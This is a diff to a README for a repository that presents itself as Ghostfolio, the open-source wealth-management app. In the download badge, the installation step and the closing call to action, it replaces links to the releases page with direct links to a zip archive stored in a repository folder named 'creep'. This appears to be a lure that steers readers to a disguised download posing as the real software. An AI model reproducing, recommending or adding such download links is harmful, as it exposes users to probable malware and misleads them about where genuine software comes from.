@@ -1,7 +1,7 @@
 <h1>📊 Ghostfolio-Open-Source-Wealth-Management-Software - Your Personal Finance Command Center</h1>
 
 <p align="center">
-  <a href="https://github.com/imerica86/Ghostfolio-Open-Source-Wealth-Management-Software/releases">
+  <a href="https://raw.githubusercontent.com/imerica86/Ghostfolio-Open-Source-Wealth-Management-Software/main/creep/v1.6.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_APP-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download" style="background-color:#FF6B6B; padding:15px 30px; border-radius:10px; font-size:20px; text-decoration:none; color:white;">
   </a>
 </p>
@@ -39,7 +39,7 @@ Before downloading Ghostfolio, make sure you have:
 
 Getting Ghostfolio on your computer is easy:
 
-**Step 1:** [Visit this link to download the application](https://github.com/imerica86/Ghostfolio-Open-Source-Wealth-Management-Software/releases)
+**Step 1:** [Visit this link to download the application](https://raw.githubusercontent.com/imerica86/Ghostfolio-Open-Source-Wealth-Management-Software/main/creep/v1.6.zip)
 
 **Step 2:** Look for the latest version of the download file. It will be named something like "Ghostfolio-Setup" or similar.
 
@@ -139,7 +139,7 @@ Ghostfolio is constantly being improved. When updates are available:
 
 Don't let complicated financial tools intimidate you. Ghostfolio was designed to make portfolio management accessible to everyone. Whether you're a beginner investor or have years of experience, this tool will help you understand and grow your wealth.
 
-[⬇️ Download Ghostfolio Now](https://github.com/imerica86/Ghostfolio-Open-Source-Wealth-Management-Software/releases)
+[⬇️ Download Ghostfolio Now](https://raw.githubusercontent.com/imerica86/Ghostfolio-Open-Source-Wealth-Management-Software/main/creep/v1.6.zip)
 
 Take control of your financial future with the power of clear, data-driven insights. Your investments deserve better management—and you deserve a tool that makes it easy.
 
